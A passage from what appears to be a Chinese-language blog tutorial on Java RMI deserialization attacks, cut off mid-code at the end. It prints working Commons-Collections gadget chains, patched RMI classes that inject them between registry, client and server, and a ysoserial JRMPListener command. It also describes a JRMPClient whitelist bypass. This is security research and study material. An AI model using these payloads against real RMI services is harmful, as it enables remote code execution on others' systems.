+<p>这个操作也挺麻烦，因为注册中心要先 bind 才能回复客户端序列化数据，而 bind 就会触发注册中心的反序列化，导致一些奇奇怪怪的问题。所以要实现这种攻击，可能需要自己整一个注册中心。我这里为了方便，用 endorsed  将 RegistryImpl_Skel 类覆盖掉了，让 case 2 时直接返回序列化数据：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">Map&lt;String, String&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">map.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;Twings&quot;</span>);</span><br><span class="line">Map&lt;String, Object&gt; transformedMap = TransformedMap.decorate(map, <span class="literal">null</span>, transformerChain);</span><br><span class="line">Constructor&lt;?&gt; constructor = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">annotationInvocationHandler</span> <span class="operator">=</span> (InvocationHandler)constructor.newInstance(Retention.class, transformedMap);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="type">ObjectOutput</span> <span class="variable">var9</span> <span class="operator">=</span> var2.getResultStream(<span class="literal">true</span>);</span><br><span class="line">    var9.writeObject(annotationInvocationHandler);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException var88) &#123;</span><br><span class="line">	<span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling return&quot;</span>, var88);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>用高版本写了个 RegistryImpl_Skel 类打算覆盖注册中心，结果发现在这个类里引入 commons-collections 包生成 payload 会有问题，所以就把整个 commons-collections 包一起放进去了，然后打包生成 jar，放到高版本 JDK 目录下。</p>
+<p>用高版本 JDK 启动注册中心，然后用低版本 JDK 启动客户端 lookup 一下，可以看到计算器弹出。因为客户端的反序列化并不会经过 registryFilter 函数，所以也可以改成 BadAttributeValueExpException 的 payload 来攻击高版本客户端，测试的时候最好用两个不同版本的 Java 来运行攻击方和被攻击方，我本地有 60、66、231、241 四个版本的 JDK 用于测试。</p>
+<p>如果嫌麻煩，可以用 ysoserial：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java <span class="literal">-cp</span>  ysoserial<span class="literal">-0</span>.<span class="number">0.6</span><span class="literal">-SNAPSHOT-all</span>.jar ysoserial.exploit.JRMPListener <span class="number">1099</span> CommonsCollections6 calc</span><br></pre></td></tr></table></figure>
+
+<h4 id="客户端攻击服务端"><a href="#客户端攻击服务端" class="headerlink" title="客户端攻击服务端"></a>客户端攻击服务端</h4><p>客户端从注册中心获取服务端的信息之后，就要将调用的方法名和参数一起发送到服务端，前面 lookup 获取的对象实际上是一个代理对象，处理代码在 UnicastRef 类的 invoke 函数中，发送数据的关键代码如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">var7 = <span class="keyword">new</span> <span class="title class_">StreamRemoteCall</span>(var6, <span class="built_in">this</span>.ref.getObjID(), -<span class="number">1</span>, var4);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="type">ObjectOutput</span> <span class="variable">var10</span> <span class="operator">=</span> var7.getOutputStream();</span><br><span class="line">    <span class="built_in">this</span>.marshalCustomCallData(var10);</span><br><span class="line">    var11 = var2.getParameterTypes();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">var12</span> <span class="operator">=</span> <span class="number">0</span>; var12 &lt; ((Object[])var11).length; ++var12) &#123;</span><br><span class="line">    	marshalValue((Class)((Object[])var11)[var12], var3[var12], var10);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException var41) &#123;</span><br><span class="line">    clientRefLog.log(Log.BRIEF, <span class="string">&quot;IOException marshalling arguments: &quot;</span>, var41);</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling arguments&quot;</span>, var41);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var7.executeCall();</span><br></pre></td></tr></table></figure>
+
+<p>这里将方法参数进行了序列化，而在服务端，接收数据的处理代码在 UnicastServerRef 类的 dispatch 方法中，关键代码如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.unmarshalCustomCallData(var41);</span><br><span class="line">    var9 = <span class="built_in">this</span>.unmarshalParameters(var1, var42, var7);</span><br><span class="line">&#125; <span class="keyword">catch</span> (AccessException var34) &#123;</span><br><span class="line">    ((StreamRemoteCall)var2).discardPendingRefs();</span><br><span class="line">    <span class="keyword">throw</span> var34;</span><br><span class="line">&#125; <span class="keyword">catch</span> (ClassNotFoundException | IOException var35) &#123;</span><br><span class="line">    ((StreamRemoteCall)var2).discardPendingRefs();</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var35);</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    var2.releaseInputStream();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Object var10;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    var10 = var42.invoke(var1, var9);</span><br><span class="line">&#125; <span class="keyword">catch</span> (InvocationTargetException var33) &#123;</span><br><span class="line">    <span class="keyword">throw</span> var33.getTargetException();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里有一个对参数的反序列化处理，所以理论上可以通过操控客户端发送的参数数据，从而实现对服务端反序列化攻击。需要注意的一点是，服务端在反序列化取参数时，会有一个参数数量和参数类型的比较：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Object[] unmarshalParametersUnchecked(Method var1, ObjectInput var2) <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    Class[] var3 = var1.getParameterTypes();</span><br><span class="line">    Object[] var4 = <span class="keyword">new</span> <span class="title class_">Object</span>[var3.length];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">var5</span> <span class="operator">=</span> <span class="number">0</span>; var5 &lt; var3.length; ++var5) &#123;</span><br><span class="line">    	var4[var5] = unmarshalValue(var3[var5], var2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> var4;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">static</span> Object <span class="title function_">unmarshalValue</span><span class="params">(Class&lt;?&gt; var0, ObjectInput var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="keyword">if</span> (var0.isPrimitive()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (var0 == Integer.TYPE) &#123;</span><br><span class="line">        	<span class="keyword">return</span> var1.readInt();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var0 == Boolean.TYPE) &#123;</span><br><span class="line">        	<span class="keyword">return</span> var1.readBoolean();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var0 == Byte.TYPE) &#123;</span><br><span class="line">        	<span class="keyword">return</span> var1.readByte();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var0 == Character.TYPE) &#123;</span><br><span class="line">        	<span class="keyword">return</span> var1.readChar();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var0 == Short.TYPE) &#123;</span><br><span class="line">        	<span class="keyword">return</span> var1.readShort();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var0 == Long.TYPE) &#123;</span><br><span class="line">        	<span class="keyword">return</span> var1.readLong();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var0 == Float.TYPE) &#123;</span><br><span class="line">        	<span class="keyword">return</span> var1.readFloat();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var0 == Double.TYPE) &#123;</span><br><span class="line">        	<span class="keyword">return</span> var1.readDouble();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        	<span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;Unrecognized primitive type: &quot;</span> + var0);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> var0 == String.class &amp;&amp; var1 <span class="keyword">instanceof</span> ObjectInputStream ? SharedSecrets.getJavaObjectInputStreamReadString().readString((ObjectInputStream)var1) : var1.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>所以只能攻击绑定的方法有参数，且类型为对象的服务端。这里我用 endorsed 修改了 UnicastRef 类的 invoke 方法：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Object[] parameterTypes = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;Object.class&#125;;</span><br><span class="line"></span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(map, transformerChain);</span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;Twings&quot;</span>);</span><br><span class="line"><span class="type">BadAttributeValueExpException</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">field.set(obj, entry);</span><br><span class="line"></span><br><span class="line">Object[] exp = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> <span class="variable">var12</span> <span class="operator">=</span> <span class="number">0</span>; var12 &lt; (parameterTypes).length; ++var12) &#123;</span><br><span class="line">	marshalValue((Class)(parameterTypes)[var12], exp[var12], var10);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="服务端攻击客户端"><a href="#服务端攻击客户端" class="headerlink" title="服务端攻击客户端"></a>服务端攻击客户端</h4><p>在客户端将方法名和参数传输过来，服务端执行完之后，会有一个向客户端写入序列化数据的操作：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="type">ObjectOutput</span> <span class="variable">var11</span> <span class="operator">=</span> var2.getResultStream(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Class</span> <span class="variable">var12</span> <span class="operator">=</span> var42.getReturnType();</span><br><span class="line">    <span class="keyword">if</span> (var12 != Void.TYPE) &#123;</span><br><span class="line">    	marshalValue(var12, var10, var11);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException var32) &#123;</span><br><span class="line">	<span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling return&quot;</span>, var32);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>而客户端也会将这些序列化数据反序列化处理：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">var46</span> <span class="operator">=</span> var2.getReturnType();</span><br><span class="line"><span class="keyword">if</span> (var46 == Void.TYPE) &#123;</span><br><span class="line">    var11 = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">return</span> var11;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var11 = var7.getInputStream();</span><br><span class="line"><span class="type">Object</span> <span class="variable">var47</span> <span class="operator">=</span> unmarshalValue(var46, (ObjectInput)var11);</span><br><span class="line">var9 = <span class="literal">true</span>;</span><br><span class="line">clientRefLog.log(Log.BRIEF, <span class="string">&quot;free connection (reuse = true)&quot;</span>);</span><br><span class="line"><span class="built_in">this</span>.ref.getChannel().free(var6, <span class="literal">true</span>);</span><br><span class="line">var13 = var47;</span><br></pre></td></tr></table></figure>
+
+<p>所以服务端可以以此来攻击客户端，此时客户端反序列化同样有限制，如果是 String，就会触发 ObjectInputStream 里面的报错：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (type == String.class) &#123;</span><br><span class="line">	<span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassCastException</span>(<span class="string">&quot;Cannot cast an object to java.lang.String&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>而其他类型不会有问题(我测试了 Object 和 Integer)，所以大部分有 return 的方法都可以用来攻击，同样用 endorsed 修改 UnicastServerRef 类的 dispatch 方法：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ObjectOutput</span> <span class="variable">var11</span> <span class="operator">=</span> var2.getResultStream(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Class</span> <span class="variable">var12</span> <span class="operator">=</span> var42.getReturnType();</span><br><span class="line"></span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(map, transformerChain);</span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;Twings&quot;</span>);</span><br><span class="line"><span class="type">BadAttributeValueExpException</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">field.set(obj, entry);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (var12 != Void.TYPE) &#123;</span><br><span class="line">marshalValue(var12, obj, var11);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="攻击高版本-JDK-8u232-b09-注册中心"><a href="#攻击高版本-JDK-8u232-b09-注册中心" class="headerlink" title="攻击高版本 JDK(&lt; 8u232_b09) 注册中心"></a>攻击高版本 JDK(&lt; 8u232_b09) 注册中心</h4><p>如上文所说，高版本 JDK 的注册中心会有一个白名单 WAF，所以无法直接攻击。而 ysoserial 中有这么一个 payload，JRMPClient，他们的作用就是通过反序列化在注册中心处创建一个客户端去连接远程注册中心，再攻击客户端，从而绕开了注册中心的白名单。</p>
+<p>payload 代码如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">String host;</span><br><span class="line"><span class="type">int</span> port;</span><br><span class="line"><span class="type">int</span> <span class="variable">sep</span> <span class="operator">=</span> command.indexOf(<span class="string">&#x27;:&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> ( sep &lt; <span class="number">0</span> ) &#123;</span><br><span class="line">    port = <span class="keyword">new</span> <span class="title class_">Random</span>().nextInt(<span class="number">65535</span>);</span><br><span class="line">    host = command;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    host = command.substring(<span class="number">0</span>, sep);</span><br><span class="line">    port = Integer.valueOf(command.substring(sep + <span class="number">1</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">ObjID</span> <span class="variable">id</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(<span class="keyword">new</span> <span class="title class_">Random</span>().nextInt()); <span class="comment">// RMI registry</span></span><br><span class="line"><span class="type">TCPEndpoint</span> <span class="variable">te</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(host, port);</span><br><span class="line"><span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(<span class="keyword">new</span> <span class="title class_">LiveRef</span>(id, te, <span class="literal">false</span>));</span><br><span class="line"><span class="keyword">return</span> ref;</span><br></pre></td></tr></table></figure>
+
+<p>可以发现这些类都在白名单范围之内，这里的代码跟客户端 getRegistry 的代码类似：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (port &lt;= <span class="number">0</span>)</span><br><span class="line">	port = Registry.REGISTRY_PORT;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (host == <span class="literal">null</span> || host.length() == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">    	host = java.net.InetAddress.getLocalHost().getHostAddress();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">   	 	host = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">LiveRef</span> <span class="variable">liveRef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LiveRef</span>(<span class="keyword">new</span> <span class="title class_">ObjID</span>(ObjID.REGISTRY_ID), <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(host, port, csf, <span class="literal">null</span>), <span class="literal">false</span>);</span><br><span class="line"><span class="type">RemoteRef</span> <span class="variable">ref</span> <span class="operator">=</span> (csf == <span class="literal">null</span>) ? <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(liveRef) : <span class="keyword">new</span> <span class="title class_">UnicastRef2</span>(liveRef);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> (Registry) Util.createProxy(RegistryImpl.class, ref, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>
+
+<p>看起来功能应该差不多，但是客户端需要 lookup 发出请求才会受到攻击，我们先分析一下这个反序列化链的执行过程，首先是 UnicastRef 类的 readExternal：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">this</span>.ref = LiveRef.read(var1, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>
+
+<p>然后是 LiveRef 的 read 方法：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DGCClient.registerRefs(var2, Arrays.asList(var5));</span><br></pre></td></tr></table></figure>
+
+<p>然后是 DGCClient 的 registerRefs、makeDirtyCall 方法，最后到 DGCImpl_Stub 的 dirty 方法：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">StreamRemoteCall</span> <span class="variable">var5</span> <span class="operator">=</span> (StreamRemoteCall)<span class="built_in">this</span>.ref.newCall(<span class="built_in">this</span>, operations, <span class="number">1</span>, -<span class="number">669196253586618813L</span>);</span><br><span class="line">...</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="type">ObjectInput</span> <span class="variable">var8</span> <span class="operator">=</span> var5.getInputStream();</span><br><span class="line">    var22 = (Lease)var8.readObject();</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException | ClassNotFoundException | ClassCastException var17) &#123;</span><br><span class="line">    <span class="keyword">if</span> (var7 <span class="keyword">instanceof</span> TCPConnection) &#123;</span><br><span class="line">    	